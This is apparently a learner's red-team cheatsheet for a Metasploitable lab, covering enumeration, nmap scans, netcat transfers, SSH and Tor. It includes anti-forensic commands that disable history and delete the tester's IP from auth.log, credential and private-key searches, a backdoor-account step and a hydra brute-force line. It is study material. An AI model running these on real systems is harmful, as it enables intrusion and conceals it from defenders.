MY RED TEAM CHEATSHEET
Ahmed Ezzat
Last Updated: July 2026

STATUS TAGS
[DONE]    = i practiced this, i can do it from memory
[TAUGHT]  = i understand it but need more practice
[STAGE 3] = i will learn this in exploitation stage
[STAGE 4] = i will learn this in Active Directory stage

======================================================
LINUX
======================================================

Find SUID binaries: [DONE]
find / -perm -4000 2>/dev/null
what i learned: finds files that run as root no matter who runs them
why it matters: these are my privesc targets in Stage 3

Find writable files: [DONE]
find / -writable -type f 2>/dev/null
what i learned: finds files anyone can write to
why it matters: if a root-owned script is writable i can edit it

Find files containing password: [DONE]
grep -r "password" /etc/ 2>/dev/null
what i learned: searches inside every file in /etc/ for the word password
why it matters: admins sometimes leave credentials in config files

List users with real shells: [DONE]
cat /etc/passwd | grep "/bin/bash"
what i learned: filters to only accounts using bash — almost always real humans
real targets: root, msfadmin, postgres, user, service
system noise: daemon, bin, www-data, nobody — ignore these
why it matters: shows me which accounts i can actually target

Live log monitoring: [DONE]
tail -f /var/log/auth.log
what i learned: watches the auth log update in real time
why it matters: i saw my own SSH login appear here live

Failed SSH attempts: [DONE]
grep "Failed password" /var/log/auth.log
what i learned: pulls every failed login with source IP and timestamp
why it matters: shows me if someone is brute forcing a machine

Successful SSH logins: [DONE]
grep "Accepted" /var/log/auth.log
what i learned: shows every successful login
why it matters: my IP appears here every time i SSH in

Check cron jobs: [DONE]
crontab -l
cat /etc/crontab
what i learned: crontab -l shows my user cron jobs
               cat /etc/crontab shows system wide jobs
               format is: minute hour day month weekday user command
               * means every — so * in hour means every hour
what i found on Metasploitable:
               17 * * * * root — runs cron.hourly scripts every hour at minute 17
               25 6 * * * root — runs cron.daily scripts every day at 6:25am
               47 6 * * 7 root — runs cron.weekly scripts every Sunday at 6:47am
               52 6 1 * * root — runs cron.monthly scripts every 1st at 6:52am
why it matters: if a root cron job runs a script i can write to
               i edit that script and it executes as root — instant privesc

Disable history: [TAUGHT — need to practice]
unset HISTFILE && export HISTSIZE=0
what i learned: unset HISTFILE stops bash writing history to disk
               export HISTSIZE=0 clears memory of commands in session
why it matters: first thing i run after getting a shell so nothing gets logged
my practice task: run on Metasploitable, type commands, check history is empty

Clear history file: [TAUGHT — need to practice]
cat /dev/null > ~/.bash_history
what i learned: /dev/null is empty — piping it overwrites the file with nothing
why it matters: clears commands typed before i disabled history
my practice task: run on Metasploitable, then cat ~/.bash_history to confirm empty

Surgical log clean: [TAUGHT — need to practice]
sed -i '/MY_IP/d' /var/log/auth.log
what i learned: sed processes text line by line
               -i edits the file directly
               /MY_IP/d deletes every line containing my IP
why it matters: removes only my entries — rest of log stays normal
               full wipe is obvious to defenders, surgical is not
my practice task:
   echo "fake entry 1.2.3.4" >> /var/log/auth.log
   sed -i '/1.2.3.4/d' /var/log/auth.log
   grep "1.2.3.4" /var/log/auth.log — should return nothing

======================================================
WINDOWS
======================================================

Navigate directories: [DONE]
cd foldername
what i learned: same as Linux cd, works in both CMD and PowerShell

List folder contents: [DONE]
dir
what i learned: Windows CMD equivalent of ls
               in PowerShell i can use ls or Get-ChildItem

File and folder permissions: [DONE]
icacls C:\path\to\file
what i learned: shows who has what permissions on a file or folder
why it matters: misconfigured permissions are a privesc path in Stage 3

Create new user: [DONE]
New-LocalUser
what i learned: PowerShell prompts me for -Name and -Password automatically
               i dont need to memorize the full syntax
               PowerShell IntelliSense suggests parameters as i type
why it matters: attackers create backdoor accounts after compromising a machine
CMD alternative: net user username password /add

PowerShell aliases: [DONE]
Get-Alias
what i learned: shows all command shortcuts in PowerShell
               ls is an alias for Get-ChildItem
               cd is an alias for Set-Location

======================================================
METASPLOITABLE — SUID BINARIES TO EXPLOIT IN STAGE 3
======================================================

/usr/bin/nmap      old version can spawn a root shell
/usr/bin/at        schedules commands — can run as root
/usr/lib/pt_chown  known privilege escalation vector

======================================================
NETWORKING
======================================================

Standard recon scan: [DONE]
nmap -sV -sC TARGET_IP
what i learned: -sV detects service versions, -sC runs default scripts
always run both together for full picture

Full port scan: [DONE]
nmap -p- TARGET_IP
what i learned: scans all 65535 ports not just top 1000

Ping sweep: [DONE]
nmap -sn 192.168.56.0/24
what i learned: finds live hosts without port scanning
always run this first to confirm Metasploitable IP before every session

Stealth scan: [TAUGHT — practice in Stage 3]
nmap -sS TARGET_IP
what i learned: sends SYN but never completes the handshake
               harder to detect than a full TCP connect scan
               needs root to run

Script scan: [DONE]
nmap -sC TARGET_IP
what i learned: runs default scripts against open ports
extra info it revealed on Metasploitable:
- port 21 — anonymous FTP login allowed, no password needed
- port 25 — VRFY enabled, can enumerate valid usernames
- port 25 — SSLv2 supported, broken encryption, cert expired 2010
- port 111 — NFS shares exposed on port 2049
- port 139 — SMB guest access allowed, message signing disabled
- machine name: metasploitable, domain: localdomain
why it matters: finds vulnerabilities that -sV misses completely

Banner grab with netcat: [DONE]
nc TARGET_IP PORT
what i learned: connects to a port and reads whatever the service sends back

Send raw HTTP GET: [TAUGHT — need to practice]
nc TARGET_IP 80
then type: GET / HTTP/1.0 and press Enter twice
what i learned: manually sends HTTP request without a browser
my practice task: nc 192.168.56.104 80 then send the GET request

Capture traffic: [DONE]
wireshark

Filter by IP in Wireshark: [DONE]
ip.addr == TARGET_IP

Filter FTP in Wireshark: [DONE]
ip.addr == TARGET_IP && ftp

File transfer via Python HTTP server: [TAUGHT — need to practice]
on Kali:   python3 -m http.server 8080
on target: wget http://192.168.56.102:8080/filename
my practice task: serve a file from Kali, download it on Metasploitable

File transfer via netcat send: [TAUGHT — need to practice]
nc TARGET_IP 4444 < file.txt

File transfer via netcat receive: [TAUGHT — need to practice]
nc -lvp 4444 > file.txt
what i learned: -l listen, -v verbose, -p port number
my practice task: transfer cheatsheet both directions between Kali and Metasploitable

Check routing table: [TAUGHT — need to practice]
route -n
what i learned: shows how my machine decides where to send traffic
my practice task: run on Kali, find the default gateway

Check ARP table: [DONE]
arp -a
what i learned: shows IP to MAC address mappings on my network

======================================================
SSH
======================================================

Basic connect: [DONE]
ssh user@IP

Connect with private key: [DONE — used in Bandit]
ssh user@IP -i keyfile

Connect on custom port: [TAUGHT]
ssh user@IP -p 2222

Generate key pair: [DONE]
ssh-keygen -t rsa -b 4096
what i learned: creates id_rsa (private) and id_rsa.pub (public)
               private key stays on my machine, public goes on target

Copy public key to target: [DONE]
ssh-copy-id user@IP

Port forwarding: [TAUGHT — practice in Stage 4]
ssh -L localport:target:targetport user@IP
what i learned: tunnels a remote port to my local machine
               used for pivoting in red team engagements

Brute force SSH: [STAGE 3]
hydra -l user -P wordlist ssh://IP

Find private keys on target: [TAUGHT]
find / -name "id_rsa" 2>/dev/null
my practice task: run on Metasploitable — check if any keys exist

======================================================
PROXYCHAINS AND TOR
======================================================

Start TOR: [DONE]
sudo service tor start

Verify IP changed: [DONE]
proxychains curl ifconfig.me

Run any tool through TOR: [DONE]
proxychains TOOL OPTIONS

Config file location: [DONE]
/etc/proxychains4.conf

======================================================
MY PYTHON TOOLS — BUILT FROM SCRATCH
======================================================

Single port checker: [DONE]
python3 ~/red-team-tools/python-tools/single_port_checker.py
what it does: checks if one port is open or closed

Port scanner: [DONE]
python3 ~/red-team-tools/python-tools/port_scanner.py
what it does: scans ports 1-1024 and prints open ones only

Banner grabber: [DONE]
python3 ~/red-team-tools/python-tools/banner_grabber.py
what it does: connects to a port and grabs the service banner

Full recon tool: [DONE]
python3 ~/red-team-tools/python-tools/recon.py
what it does: combines scanner and banner grabber in one tool

======================================================
MY LAB
======================================================

Metasploitable IP:  192.168.56.104
Kali IP:            192.168.56.102
Credentials:        msfadmin / msfadmin (FTP, SSH, Telnet)

Vulnerabilities to exploit in Stage 3:
vsftpd 2.3.4   port 21   backdoor — instant root shell
Samba 3.0.20   port 139  usermap_script — instant root shell
UnrealIRCd     port 6667 backdoor — instant root shell
Bindshell      port 1524 already open — netcat = instant root

======================================================
SERVICES I FOUND ON METASPLOITABLE
======================================================

Port 21   FTP         vsftpd 2.3.4        CRITICAL
Port 22   SSH         OpenSSH 4.7p1       HIGH
Port 23   Telnet      plaintext login     HIGH
Port 25   SMTP        Postfix             MEDIUM
Port 53   DNS         BIND 9.4.2          MEDIUM
Port 80   HTTP        Apache 2.2.8        HIGH
Port 111  RPC                             LOW
Port 139  SMB         Samba 3.0.20        CRITICAL
Port 445  SMB         Samba 3.0.20        CRITICAL
Port 512  rexec                           HIGH
Port 513  rlogin                          HIGH
Port 514  rsh                             HIGH
Port 1099 Java RMI                        MEDIUM
Port 1524 Bindshell   root shell open     CRITICAL
Port 2049 NFS                             MEDIUM
Port 2121 FTP         ProFTPD 1.3.1       HIGH
Port 3306 MySQL       5.0.51a             HIGH
Port 5432 PostgreSQL  8.3.0               HIGH
Port 5900 VNC         protocol 3.3        HIGH
Port 6667 IRC         UnrealIRCd          CRITICAL
Port 8180 Tomcat      Apache Tomcat       HIGH

======================================================
THINGS I STILL NEED TO PRACTICE
======================================================

[ ] disable history on Metasploitable, run commands, verify history is empty
[ ] clear bash history file, verify it is empty
[ ] add fake log entry, delete with sed, verify it is gone
[ ] send raw HTTP GET to port 80 using netcat manually
[ ] transfer a file Kali to Metasploitable via Python HTTP server
[ ] transfer a file both directions via netcat
[ ] run route -n on Kali and identify the default gateway
[ ] find all private keys on Metasploitable
[ ] connect to SSH on custom port
[ ] practice stealth scan in Stage 3

[x] run crontab -l and cat /etc/crontab on Metasploitable — DONE
[x] run nmap -sC and read script output — DONE
[x] run nmap -sV and identify all services — DONE
[x] find SUID binaries on Metasploitable — DONE
[x] list users with real shells — DONE
[x] SSH into Metasploitable — DONE
[x] read auth.log live while SSHing in — DONE
[x] grep failed and accepted logins from auth.log — DONE
[x] built 4 Python tools from scratch — DONE
[x] set up GitHub and pushed all tools — DONE
